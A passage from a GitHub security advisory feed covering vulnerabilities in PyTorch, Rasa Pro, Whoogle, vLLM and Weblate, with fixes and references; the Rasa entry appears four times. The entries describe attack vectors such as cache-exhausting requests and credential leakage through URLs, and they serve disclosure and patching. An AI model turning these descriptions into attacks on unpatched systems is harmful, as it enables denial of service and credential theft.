<p>This vulnerability was found by Ji'an Zhou.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6">https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6</a></li>
<li><a href="https://github.com/pytorch/pytorch/commit/8d4b8a920a2172523deb95bf20e8e52d50649c04">https://github.com/pytorch/pytorch/commit/8d4b8a920a2172523deb95bf20e8e52d50649c04</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32434">https://nvd.nist.gov/vuln/detail/CVE-2025-32434</a></li>
<li><a href="https://github.com/advisories/GHSA-53q9-r3pm-6pq6">https://github.com/advisories/GHSA-53q9-r3pm-6pq6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-53q9-r3pm-6pq6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-18T15:19:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rasa-pro] Rasa Pro Missing Authentication For Voice Connector APIs]]></title>
        <id>https://github.com/advisories/GHSA-7xq5-54jp-2mfg</id>
        <link href="https://github.com/advisories/GHSA-7xq5-54jp-2mfg"/>
        <updated>2025-04-23T14:34:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability">Vulnerability</h2>
<p>A vulnerability has been identified in Rasa Pro where voice connectors in Rasa Pro do not properly implement authentication even when a token is configured in the <code>credentials.yml</code> file. This could allow an attacker to submit voice data to the Rasa Pro assistant from an unauthenticated source.</p>
<p>This impacts the following connectors:</p>
<ul>
<li><code>audiocodes_stream</code></li>
<li><code>genesys</code></li>
<li><code>jambonz</code></li>
</ul>
<p>As part of our investigation to resolve this issue, we have also performed a security review of our other voice channel connectors:</p>
<ul>
<li><code>browser_audio</code>: Does not support authentication. This is a development channel not intended for production use.</li>
<li><code>twilio_media_streams</code>, <code>twilio_voice</code> and <code>jambonz</code>: Authentication is currently not supported by these channels, but our investigation has found a way for us to enable it for these voice channel connectors in a future Rasa Pro release.</li>
</ul>
<h2 id="fix">Fix</h2>
<p>The issue has been resolved for <code>audiocodes</code>, <code>audiocodes_stream</code>, and <code>genesys</code> connectors. Fixed versions of Rasa Pro have been released for <code>3.9.20</code>, <code>3.10.19</code>, <code>3.11.7</code> and <code>3.12.6</code>. Please update to a fixed release.</p>
<p>If you are using one of the affected connectors, we strongly recommend upgrading to a fixed version. For connectors where authentication is not supported (e.g., Twilio), we suggest taking extra caution and considering other compensating controls if applicable.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg">https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>
<li><a href="https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg">https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32377">https://nvd.nist.gov/vuln/detail/CVE-2025-32377</a></li>
<li><a href="https://github.com/advisories/GHSA-7xq5-54jp-2mfg">https://github.com/advisories/GHSA-7xq5-54jp-2mfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7xq5-54jp-2mfg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-17T18:33:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rasa-pro] Rasa Pro Missing Authentication For Voice Connector APIs]]></title>
        <id>https://github.com/advisories/GHSA-7xq5-54jp-2mfg</id>
        <link href="https://github.com/advisories/GHSA-7xq5-54jp-2mfg"/>
        <updated>2025-04-23T14:34:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability">Vulnerability</h2>
<p>A vulnerability has been identified in Rasa Pro where voice connectors in Rasa Pro do not properly implement authentication even when a token is configured in the <code>credentials.yml</code> file. This could allow an attacker to submit voice data to the Rasa Pro assistant from an unauthenticated source.</p>
<p>This impacts the following connectors:</p>
<ul>
<li><code>audiocodes_stream</code></li>
<li><code>genesys</code></li>
<li><code>jambonz</code></li>
</ul>
<p>As part of our investigation to resolve this issue, we have also performed a security review of our other voice channel connectors:</p>
<ul>
<li><code>browser_audio</code>: Does not support authentication. This is a development channel not intended for production use.</li>
<li><code>twilio_media_streams</code>, <code>twilio_voice</code> and <code>jambonz</code>: Authentication is currently not supported by these channels, but our investigation has found a way for us to enable it for these voice channel connectors in a future Rasa Pro release.</li>
</ul>
<h2 id="fix">Fix</h2>
<p>The issue has been resolved for <code>audiocodes</code>, <code>audiocodes_stream</code>, and <code>genesys</code> connectors. Fixed versions of Rasa Pro have been released for <code>3.9.20</code>, <code>3.10.19</code>, <code>3.11.7</code> and <code>3.12.6</code>. Please update to a fixed release.</p>
<p>If you are using one of the affected connectors, we strongly recommend upgrading to a fixed version. For connectors where authentication is not supported (e.g., Twilio), we suggest taking extra caution and considering other compensating controls if applicable.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg">https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>
<li><a href="https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg">https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32377">https://nvd.nist.gov/vuln/detail/CVE-2025-32377</a></li>
<li><a href="https://github.com/advisories/GHSA-7xq5-54jp-2mfg">https://github.com/advisories/GHSA-7xq5-54jp-2mfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7xq5-54jp-2mfg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-17T18:33:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rasa-pro] Rasa Pro Missing Authentication For Voice Connector APIs]]></title>
        <id>https://github.com/advisories/GHSA-7xq5-54jp-2mfg</id>
        <link href="https://github.com/advisories/GHSA-7xq5-54jp-2mfg"/>
        <updated>2025-04-23T14:34:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability">Vulnerability</h2>
<p>A vulnerability has been identified in Rasa Pro where voice connectors in Rasa Pro do not properly implement authentication even when a token is configured in the <code>credentials.yml</code> file. This could allow an attacker to submit voice data to the Rasa Pro assistant from an unauthenticated source.</p>
<p>This impacts the following connectors:</p>
<ul>
<li><code>audiocodes_stream</code></li>
<li><code>genesys</code></li>
<li><code>jambonz</code></li>
</ul>
<p>As part of our investigation to resolve this issue, we have also performed a security review of our other voice channel connectors:</p>
<ul>
<li><code>browser_audio</code>: Does not support authentication. This is a development channel not intended for production use.</li>
<li><code>twilio_media_streams</code>, <code>twilio_voice</code> and <code>jambonz</code>: Authentication is currently not supported by these channels, but our investigation has found a way for us to enable it for these voice channel connectors in a future Rasa Pro release.</li>
</ul>
<h2 id="fix">Fix</h2>
<p>The issue has been resolved for <code>audiocodes</code>, <code>audiocodes_stream</code>, and <code>genesys</code> connectors. Fixed versions of Rasa Pro have been released for <code>3.9.20</code>, <code>3.10.19</code>, <code>3.11.7</code> and <code>3.12.6</code>. Please update to a fixed release.</p>
<p>If you are using one of the affected connectors, we strongly recommend upgrading to a fixed version. For connectors where authentication is not supported (e.g., Twilio), we suggest taking extra caution and considering other compensating controls if applicable.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg">https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>
<li><a href="https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg">https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32377">https://nvd.nist.gov/vuln/detail/CVE-2025-32377</a></li>
<li><a href="https://github.com/advisories/GHSA-7xq5-54jp-2mfg">https://github.com/advisories/GHSA-7xq5-54jp-2mfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7xq5-54jp-2mfg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-17T18:33:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rasa-pro] Rasa Pro Missing Authentication For Voice Connector APIs]]></title>
        <id>https://github.com/advisories/GHSA-7xq5-54jp-2mfg</id>
        <link href="https://github.com/advisories/GHSA-7xq5-54jp-2mfg"/>
        <updated>2025-04-23T14:34:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability">Vulnerability</h2>
<p>A vulnerability has been identified in Rasa Pro where voice connectors in Rasa Pro do not properly implement authentication even when a token is configured in the <code>credentials.yml</code> file. This could allow an attacker to submit voice data to the Rasa Pro assistant from an unauthenticated source.</p>
<p>This impacts the following connectors:</p>
<ul>
<li><code>audiocodes_stream</code></li>
<li><code>genesys</code></li>
<li><code>jambonz</code></li>
</ul>
<p>As part of our investigation to resolve this issue, we have also performed a security review of our other voice channel connectors:</p>
<ul>
<li><code>browser_audio</code>: Does not support authentication. This is a development channel not intended for production use.</li>
<li><code>twilio_media_streams</code>, <code>twilio_voice</code> and <code>jambonz</code>: Authentication is currently not supported by these channels, but our investigation has found a way for us to enable it for these voice channel connectors in a future Rasa Pro release.</li>
</ul>
<h2 id="fix">Fix</h2>
<p>The issue has been resolved for <code>audiocodes</code>, <code>audiocodes_stream</code>, and <code>genesys</code> connectors. Fixed versions of Rasa Pro have been released for <code>3.9.20</code>, <code>3.10.19</code>, <code>3.11.7</code> and <code>3.12.6</code>. Please update to a fixed release.</p>
<p>If you are using one of the affected connectors, we strongly recommend upgrading to a fixed version. For connectors where authentication is not supported (e.g., Twilio), we suggest taking extra caution and considering other compensating controls if applicable.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg">https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>
<li><a href="https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg">https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32377">https://nvd.nist.gov/vuln/detail/CVE-2025-32377</a></li>
<li><a href="https://github.com/advisories/GHSA-7xq5-54jp-2mfg">https://github.com/advisories/GHSA-7xq5-54jp-2mfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7xq5-54jp-2mfg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-17T18:33:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[torch] PyTorch Improper Resource Shutdown or Release vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-887c-mr87-cxwp</id>
        <link href="https://github.com/advisories/GHSA-887c-mr87-cxwp"/>
        <updated>2025-04-16T21:55:38.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability, which was classified as problematic, was found in PyTorch 2.6.0. Affected is the function torch.nn.functional.ctc_loss of the file aten/src/ATen/native/LossCTC.cpp. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The name of the patch is 46fc5d8e360127361211cb237d5f9eef0223e567. It is recommended to apply a patch to fix this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3730">https://nvd.nist.gov/vuln/detail/CVE-2025-3730</a></li>
<li><a href="https://github.com/pytorch/pytorch/issues/150835">https://github.com/pytorch/pytorch/issues/150835</a></li>
<li><a href="https://github.com/pytorch/pytorch/pull/150981">https://github.com/pytorch/pytorch/pull/150981</a></li>
<li><a href="https://vuldb.com/?ctiid.305076">https://vuldb.com/?ctiid.305076</a></li>
<li><a href="https://vuldb.com/?id.305076">https://vuldb.com/?id.305076</a></li>
<li><a href="https://vuldb.com/?submit.553645">https://vuldb.com/?submit.553645</a></li>
<li><a href="https://github.com/pytorch/pytorch/commit/01f226bfb8f2c343f5c614a6bbf685d91160f3af">https://github.com/pytorch/pytorch/commit/01f226bfb8f2c343f5c614a6bbf685d91160f3af</a></li>
<li><a href="https://github.com/advisories/GHSA-887c-mr87-cxwp">https://github.com/advisories/GHSA-887c-mr87-cxwp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-887c-mr87-cxwp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-16T21:30:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[whoogle-search] Whoogle allows attackers to execute arbitrary code via supplying a crafted search query]]></title>
        <id>https://github.com/advisories/GHSA-2689-cw26-6cpj</id>
        <link href="https://github.com/advisories/GHSA-2689-cw26-6cpj"/>
        <updated>2025-04-16T20:38:01.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in the component /models/config.py of Whoogle search v0.9.0 allows attackers to execute arbitrary code via supplying a crafted search query.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53305">https://nvd.nist.gov/vuln/detail/CVE-2024-53305</a></li>
<li><a href="https://github.com/benbusby/whoogle-search/commit/223f00c3c0533423114f99b30c561278bc0b42ba">https://github.com/benbusby/whoogle-search/commit/223f00c3c0533423114f99b30c561278bc0b42ba</a></li>
<li><a href="https://gist.github.com/fern89/ca5fe76ad81b4bc363e7341e523a1651">https://gist.github.com/fern89/ca5fe76ad81b4bc363e7341e523a1651</a></li>
<li><a href="https://fern89.github.io/posts/whoogle-rce">https://fern89.github.io/posts/whoogle-rce</a></li>
<li><a href="https://github.com/advisories/GHSA-2689-cw26-6cpj">https://github.com/advisories/GHSA-2689-cw26-6cpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2689-cw26-6cpj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-16T18:31:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[torch] PyTorch susceptible to local Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-3749-ghw9-m3mg</id>
        <link href="https://github.com/advisories/GHSA-3749-ghw9-m3mg"/>
        <updated>2025-04-23T14:52:12.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability, which was classified as problematic, has been found in PyTorch 2.6.0+cu124. Affected by this issue is the function torch.mkldnn_max_pool2d. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2953">https://nvd.nist.gov/vuln/detail/CVE-2025-2953</a></li>
<li><a href="https://github.com/pytorch/pytorch/issues/149274">https://github.com/pytorch/pytorch/issues/149274</a></li>
<li><a href="https://github.com/pytorch/pytorch/issues/149274#issue-2923122269">https://github.com/pytorch/pytorch/issues/149274#issue-2923122269</a></li>
<li><a href="https://vuldb.com/?ctiid.302006">https://vuldb.com/?ctiid.302006</a></li>
<li><a href="https://vuldb.com/?id.302006">https://vuldb.com/?id.302006</a></li>
<li><a href="https://vuldb.com/?submit.521279">https://vuldb.com/?submit.521279</a></li>
<li><a href="https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models">https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models</a></li>
<li><a href="https://github.com/advisories/GHSA-3749-ghw9-m3mg">https://github.com/advisories/GHSA-3749-ghw9-m3mg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3749-ghw9-m3mg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-30T18:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM vulnerable to Denial of Service by abusing xgrammar cache]]></title>
        <id>https://github.com/advisories/GHSA-hf3c-wxg2-49q9</id>
        <link href="https://github.com/advisories/GHSA-hf3c-wxg2-49q9"/>
        <updated>2025-04-15T21:21:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This report is to highlight a vulnerability in XGrammar, a library used by the structured output feature in vLLM. The XGrammar advisory is here: <a href="https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3">https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3</a></p>
<p>The <a href="https://xgrammar.mlc.ai/docs/">xgrammar</a> library is the default backend used by vLLM to support structured output (a.k.a. guided decoding). Xgrammar provides a required, built-in cache for its compiled grammars stored in RAM. xgrammar is available by default through the OpenAI compatible API server with both the V0 and V1 engines.</p>
<p>A malicious user can send a stream of very short decoding requests with unique schemas, resulting in an addition to the cache for each request. This can result in a Denial of Service by consuming all of the system's RAM.</p>
<p>Note that even if vLLM was configured to use a different backend by default, it is still possible to choose xgrammar on a per-request basis using the <code>guided_decoding_backend</code> key of the <code>extra_body</code> field of the request with the V0 engine. This per-request choice is not available when using the V1 engine. </p>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/pull/16283">https://github.com/vllm-project/vllm/pull/16283</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no way to workaround this issue in existing versions of vLLM other than preventing untrusted access to the OpenAI compatible API server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3">https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3">https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3</a></li>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-hf3c-wxg2-49q9">https://github.com/vllm-project/vllm/security/advisories/GHSA-hf3c-wxg2-49q9</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/16283">https://github.com/vllm-project/vllm/pull/16283</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/cb84e45ac75b42ba6795145923e8eb323bb825ad">https://github.com/vllm-project/vllm/commit/cb84e45ac75b42ba6795145923e8eb323bb825ad</a></li>
<li><a href="https://github.com/advisories/GHSA-hf3c-wxg2-49q9">https://github.com/advisories/GHSA-hf3c-wxg2-49q9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hf3c-wxg2-49q9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-15T21:21:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[weblate] VCS credentials included in URL parameters are potentially logged and saved into browser history as plaintext]]></title>
        <id>https://github.com/advisories/GHSA-m67m-3p5g-cw9j</id>
        <link href="https://github.com/advisories/GHSA-m67m-3p5g-cw9j"/>
        <updated>2025-04-15T21:42:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When creating a new component from an existing component that has a source code repository URL specified in settings, this URL is included in the client's URL parameters during the creation process. If, for example, the source code repository URL contains GitHub credentials, the confidential PAT and username are shown in plaintext and get saved into browser history. Moreover, if the request URL is logged, the credentials are written to the logs in plaintext.</p>
<p>The problematic URL in question is of this form:</p>
<pre><code>https://&lt;HOST&gt;/create/component/vcs/?repo=https%3A%2F%2F&lt;GITHUB USERNAME&gt;%3A&lt;GITHUB PAT&gt;%40github.com%2F&lt;REPOSITORY OWNER&gt;%2F&lt;REPOSITORY NAME&gt;.git&amp;project=1&amp;category=&amp;name=&lt;REDACTED&gt;&amp;slug=&lt;REDACTED&gt;&amp;is_glossary=False&amp;vcs=github&amp;source_language=228&amp;license=&amp;source_component=1#existing
</code></pre>
<p>If using Weblate official Docker image, nginx logs the URL and the token in plaintext:</p>
<pre><code>nginx stdout | 127.0.0.1 - - [04/Apr/2025:10:46:54 +0000] "GET /create/component/vcs/?repo=https%3A%2F%2F&lt;GITHUB USERNAME&gt;%3A&lt;GITHUB PAT&gt;%40github.com%2F&lt;REPOSITORY OWNER&gt;%2F&lt;REPOSITORY NAME&gt;.git&amp;project=1&amp;category=&amp;name=&lt;REDACTED&gt;&amp;slug=&lt;REDACTED&gt;&amp;is_glossary=False&amp;vcs=github&amp;source_language=228&amp;license=&amp;source_component=1 HTTP/1.1" 200 17625 "&lt;REDACTED&gt;" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0"
</code></pre>
<h3 id="reproduction">Reproduction</h3>
<ol>
<li>In a project, create a component which has the <em>Repository push URL</em> setting configured with, for example, a GitHub repository URL including a username and a PAT.</li>
<li>In the same project, create another component using the <em>From existing component</em> option and selecting the previous component as the source. Click <em>Continue</em>.</li>
<li>Observe that the URL parameter <code>repo</code> includes the secret PAT configured in the original components settings. The URL with the token is potentially saved as plaintext in browser history and server logs.</li>
<li>Select a translation file to import and click <em>Continue</em>.</li>
<li>Observe again the same <code>repo</code> parameter in the URL.</li>
</ol>
<h3 id="impact">Impact</h3>
<ul>
<li>If server logs are compromised, the attacker may be able to gain access to private repositories potentially containing sensitive source code.</li>
<li>Under common browser settings, the URL containing VCS credentials is saved into browser history. Browser extensions, for example, are often able to read the history and thus offer a realistic attack vector to gain access to the credentials.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/WeblateOrg/weblate/security/advisories/GHSA-m67m-3p5g-cw9j">https://github.com/WeblateOrg/weblate/security/advisories/GHSA-m67m-3p5g-cw9j</a></li>
<li><a href="https://github.com/WeblateOrg/weblate/releases/tag/weblate-5.11">https://github.com/WeblateOrg/weblate/releases/tag/weblate-5.11</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32021">https://nvd.nist.gov/vuln/detail/CVE-2025-32021</a></li>
<li><a href="https://github.com/advisories/GHSA-m67m-3p5g-cw9j">https://github.com/advisories/GHSA-m67m-3p5g-cw9j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m67m-3p5g-cw9j</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-15T14:20:38.000Z</published>
    </entry>
</feed>